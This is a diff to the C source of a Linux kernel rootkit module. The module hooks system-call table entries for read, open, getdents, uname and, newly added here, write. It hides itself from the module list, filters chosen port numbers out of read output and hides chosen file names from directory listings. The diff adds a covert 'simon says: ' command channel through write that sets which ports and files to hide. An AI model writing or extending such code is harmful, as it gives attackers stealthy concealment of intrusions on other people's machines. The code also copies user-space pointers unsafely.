@@ -8,8 +8,7 @@
  *        Version:  1.0 *        Created:  03/27/2015 01:43:28 AM
  *       Revision:  none
  *       Compiler:  gcc
- *
- *         Author:  samy shehata
+ * *         Author:  samy shehata
  *   Organization:  
  *
  * =====================================================================================
@@ -39,6 +38,7 @@
 #include <asm/uaccess.h>
 #include <linux/kdev_t.h>
 #include <linux/stat.h>
+#include <linux/pid.h>
 #include <asm/stat.h>
 #include <linux/string.h>
 #include <linux/namei.h>
@@ -51,15 +51,43 @@ MODULE_LICENSE("GPL");
 
 static struct list_head *prev_entry; /* Pointer to previous entry in proc/modules */
 static unsigned long **_sys_call_table = NULL;
-static int failed = 0;
 static char opened_name[50];
 static long opened_fd;
+static char ports[10][6];
+static int port = 0;
+static char hidden[10][50];
+static int sizes[10];
+static int last_hidden = 0;
 
 static asmlinkage long (*org_uname) (struct new_utsname *);
-static asmlinkage long (*org_getdents64)(unsigned int, struct linux_dirent64 __user *, unsigned int);
 static asmlinkage long (*org_getdents)(unsigned int, struct linux_dirent __user *, unsigned int);
 static asmlinkage long (*org_read)(unsigned int, char __user *, size_t);
 static asmlinkage long (*org_open)(const char __user *, int, umode_t);
+static asmlinkage long (*org_write)(unsigned int, const char __user *, size_t);
+
+static asmlinkage long write(unsigned int fd, const char __user *buf, size_t count) {
+  if (strncmp(buf, "simon says: ", sizeof("simon says: ")-1) == 0) {
+    buf += (sizeof("simon says: ")-1);
+    switch(*buf) {
+      case 0:
+        strncpy(ports[port++], buf+1, 5);
+        printk("%s\n", ports[port-1]);
+        break;
+      case 1:
+        buf += 1;
+        kstrtoint_from_user(buf, 2, 10, &sizes[last_hidden]);
+        buf += 2;
+        strncpy(hidden[last_hidden], buf, sizes[last_hidden]);
+        printk("%s\n", hidden[last_hidden]);
+        printk("%i\n", sizes[last_hidden]);
+        last_hidden += 1;
+        break;
+    }
+    return 0;
+  } else {
+    return org_write(fd, buf, count);
+  }
+}
 
 static asmlinkage long open(const char __user *filename, int flags, umode_t mode) {
   strcpy(opened_name, filename);
@@ -68,7 +96,7 @@ static asmlinkage long open(const char __user *filename, int flags, umode_t mode
 }
 
 static asmlinkage long read(unsigned int fd, char __user *buf, size_t count) {
-  int i,j,p,k;
+  int i,j,p,k,ptr;
   int ret;
   mm_segment_t old_fs;
   char line[500];
@@ -83,10 +111,12 @@ static asmlinkage long read(unsigned int fd, char __user *buf, size_t count) {
       if (buf[i] == '\n' || buf[i] == '\0') {
         line[j] = buf[i];
         copy = 1;
-        for (k = 0; k < j - 4; k++) {
-          if (strncmp(line+k, ":0035", 5) == 0) {
-            copy = 0;
-            break;
+        for (ptr = 0; ptr < port; ptr++) {
+          for (k = 0; k < j - 4; k++) {
+            if (strncmp(line+k, ports[ptr], 5) == 0) {
+              copy = 0;
+              break;
+            }
           }
         }
         if (copy) {
@@ -110,20 +140,10 @@ end:
   return ret;
 }
 
-struct linux_dirent {
-  unsigned long d_ino;
-  unsigned long d_off;
-  unsigned short d_reclen;
-  char pad;
-  char d_type;
-  char d_name[];
-};
-
 static asmlinkage long getdents(unsigned int fd, struct linux_dirent __user
     *dirp, unsigned int count) {
-  int i, j;
-  char *p;
-  char* userp, *buf;
+  int i, j, ptr;
+  char* buf;
   int ret;
   mm_segment_t old_fs;
 
@@ -133,66 +153,22 @@ static asmlinkage long getdents(unsigned int fd, struct linux_dirent __user
   set_fs(old_fs);
   buf = (char *)dirp;
   for (i = j = 0; i < ret; i++,j++) {
-    if (i == 0)
-      printk("start\n");
-    printk("%c\n", buf[i]);
     buf[j] = buf[i];
-    if (strncmp(buf + i, "118", 3) == 0) {
-      printk("Found\n");
-      for (; buf[i] != '\0'; i++);
-      for (; i % 8 != 0; i++);
-      i--;
-      j -= 19;
-      //i += 5;
+    for (ptr = 0; ptr < last_hidden; ptr++) {
+      printk("%s %x \n", hidden[ptr], sizes[ptr]);
+      if (strncmp(buf + i, hidden[ptr], sizes[ptr]) == 0) {
+        for (; buf[i] != '\0'; i++);
+        for (; i % 8 != 0; i++);
+        i--;
+        j -= 19;
+      }
     }
-    if (i == ret - 1)
-      printk("end\n");
   }
   if (ret > 0)
     ret = j;
-end:
-  return ret;
-}
-
-static asmlinkage long getdents64(unsigned int fd, struct linux_dirent64 __user
-    *dirp, unsigned int count) {
-  int i,j;
-  struct linux_dirent64 *p;
-  char* userp, *buf;
-  int ret;
-  mm_segment_t old_fs;
-
-  buf = kmalloc(count, GFP_KERNEL);
-  if (!buf)
-    return -ENOBUFS;
-
-  old_fs = get_fs();
-  set_fs(KERNEL_DS);
-  ret = org_getdents64(fd, (struct linux_dirent64*) dirp, count);
-  set_fs(old_fs);
-
-  userp = (char *)dirp;
-  /* 
-     for (i = j = 0; i < ret; i+= p->d_reclen) {
-     p = (struct linux_dirent64 *) (buf + i);
-     if (strncmp(p->d_name, "lol", sizeof("lol") == 0))
-     continue;
-
-     if (copy_to_user(dirp + j, p, p->d_reclen)) {
-     ret = -EAGAIN;
-     goto end;
-     }
-     j += p->d_reclen;
-     }
-     if  (ret > 0)
-     ret = j;
-     l */
-end:
-  kfree(buf);
 
   return ret;
 }
-
 
 static asmlinkage long uname(struct new_utsname *name) {
   org_uname(name);
@@ -215,8 +191,6 @@ static void find_sctable(void) {
       break;
     }
   }
-  if (_sys_call_table == NULL)
-    failed = 1;
 }
 
 static inline void memorize(void) {
@@ -227,6 +201,7 @@ static inline void memorize(void) {
   org_read = _sys_call_table[__NR_read];
   org_open = _sys_call_table[__NR_open];
   org_getdents = _sys_call_table[__NR_getdents];
+  org_write = _sys_call_table[__NR_write];
 }
 
 static inline void vanish(void) {
@@ -277,6 +252,7 @@ static int __init load_module(void) {
   _sys_call_table[__NR_read] = read;
   _sys_call_table[__NR_open] = open;
   _sys_call_table[__NR_getdents] = getdents;
+  _sys_call_table[__NR_write] = write;
   return 0;
 }
 
@@ -286,6 +262,7 @@ static void __exit cleanup(void) {
   _sys_call_table[__NR_open] = org_open;
   _sys_call_table[__NR_read] = org_read;
   _sys_call_table[__NR_getdents] = org_getdents;
+  _sys_call_table[__NR_write] = org_write;
   set_write_permission();
   return;
 }
